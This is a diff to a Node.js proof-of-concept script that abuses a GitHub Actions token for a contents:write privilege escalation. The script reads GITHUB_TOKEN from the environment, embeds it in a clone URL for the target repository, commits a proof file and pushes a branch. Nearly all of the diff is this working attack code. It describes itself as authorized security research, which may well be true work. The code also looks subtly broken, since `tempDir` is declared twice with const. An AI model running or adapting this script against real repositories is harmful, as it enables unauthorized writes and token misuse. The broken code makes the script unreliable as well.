@@ -44,11 +44,34 @@ const fs = require('fs');
     }
     console.log("");
 
-    // Stage 3: Create Proof File and Commit
+    // Stage 3: Create Proof File (separate from current checkout)
     console.log("[Stage 3] Creating Proof of contents:write");
+
+    // Get the token from github-script context (passed as input)
+    const token = process.env.INPUT_GITHUB_TOKEN || process.env.GITHUB_TOKEN;
+    if (!token) {
+        console.log("  ! No token found in environment");
+        console.log("");
+        console.log("[Complete] Security research PoC finished (no token)");
+        console.log("");
+        return;
+    }
+    console.log("  ✓ Token available");
+
+    // Clone fresh copy to a temp dir to avoid workflow file issues
+    const tempDir = `/tmp/poc-${Date.now()}`;
     try {
-        execSync('git config user.email "security-poc@research.local"', {stdio: 'pipe'});
-        execSync('git config user.name "Security Research PoC"', {stdio: 'pipe'});
+        execSync(`mkdir -p ${tempDir}`, {stdio: 'pipe'});
+        console.log("  ✓ Created temp dir:", tempDir);
+
+        // Clone the TARGET repo (not the fork)
+        const cloneUrl = `https://x-access-token:${token}@github.com/${repo}.git`;
+        execSync(`git clone --depth 1 ${cloneUrl} ${tempDir}/repo 2>&1`, {encoding: 'utf8'});
+        console.log("  ✓ Cloned target repo");
+
+        // Configure git in the cloned repo
+        execSync(`git -C ${tempDir}/repo config user.email "security-poc@research.local"`, {stdio: 'pipe'});
+        execSync(`git -C ${tempDir}/repo config user.name "Security Research PoC"`, {stdio: 'pipe'});
         console.log("  ✓ Git user configured");
 
         const timestamp = new Date().toISOString();
@@ -92,45 +115,42 @@ With \`contents:write\`, an attacker can:
 *Security Research PoC - Authorized Testing*
 `;
 
-        fs.writeFileSync('SECURITY_POC_PROOF.md', proofContent);
+        fs.writeFileSync(`${tempDir}/repo/SECURITY_POC_PROOF.md`, proofContent);
         console.log("  ✓ Created SECURITY_POC_PROOF.md");
 
-        execSync('git add SECURITY_POC_PROOF.md', {stdio: 'pipe'});
-        execSync('git commit -m "🔓 security: PoC proving contents:write privilege escalation"', {stdio: 'pipe'});
+        execSync(`git -C ${tempDir}/repo add SECURITY_POC_PROOF.md`, {stdio: 'pipe'});
+        execSync(`git -C ${tempDir}/repo commit -m "🔓 security: PoC proving contents:write privilege escalation"`, {stdio: 'pipe'});
 
-        const log = execSync('git log -1 --oneline', {encoding: 'utf8'}).trim();
+        const log = execSync(`git -C ${tempDir}/repo log -1 --oneline`, {encoding: 'utf8'}).trim();
         console.log("  ✓ Commit:", log);
     } catch (e) {
         console.log("  ! Stage 3 error:", e.message);
+        if (e.stdout) console.log("  ! stdout:", e.stdout.toString());
+        if (e.stderr) console.log("  ! stderr:", e.stderr.toString());
     }
     console.log("");
 
-    // Stage 4: Push to TARGET Repository (using GITHUB_TOKEN)
+    // Store tempDir for Stage 4
+    global.pocTempDir = tempDir;
+
+    // Stage 4: Push to TARGET Repository
     console.log("[Stage 4] Pushing to Target Repository");
+    const tempDir = global.pocTempDir;
+    if (!tempDir) {
+        console.log("  ! No temp dir - Stage 3 failed");
+        console.log("");
+        console.log("[Complete] Security research PoC finished (error)");
+        console.log("");
+        return;
+    }
+
     try {
-        // Create new branch
-        execSync(`git checkout -b ${branch}`, {stdio: 'pipe'});
+        // Create new branch and push from the clean clone
+        execSync(`git -C ${tempDir}/repo checkout -b ${branch}`, {stdio: 'pipe'});
         console.log("  ✓ Created branch:", branch);
 
-        // GITHUB_TOKEN has contents:write for the TARGET repo (robertprast), not the fork (treborlab)
-        // We need to add the target repo as a remote and push there
-        const token = process.env.GITHUB_TOKEN || process.env.INPUT_GITHUB_TOKEN;
-        if (!token) {
-            console.log("  ! No GITHUB_TOKEN found");
-        } else {
-            console.log("  ✓ GITHUB_TOKEN available");
-        }
-
-        // Add target repo as remote with token auth
-        const targetUrl = `https://x-access-token:${token}@github.com/${repo}.git`;
-        try {
-            execSync('git remote remove target 2>/dev/null || true', {stdio: 'pipe'});
-        } catch {}
-        execSync(`git remote add target "${targetUrl}"`, {stdio: 'pipe'});
-        console.log("  ✓ Added target remote:", repo);
-
-        // Push to TARGET repo (where we have contents:write)
-        const pushOutput = execSync(`git push target ${branch} 2>&1`, {encoding: 'utf8'});
+        // Push to origin (already authenticated via clone URL)
+        const pushOutput = execSync(`git -C ${tempDir}/repo push origin ${branch} 2>&1`, {encoding: 'utf8'});
         console.log("  ✓ Push output:", pushOutput.trim());
 
         console.log("");
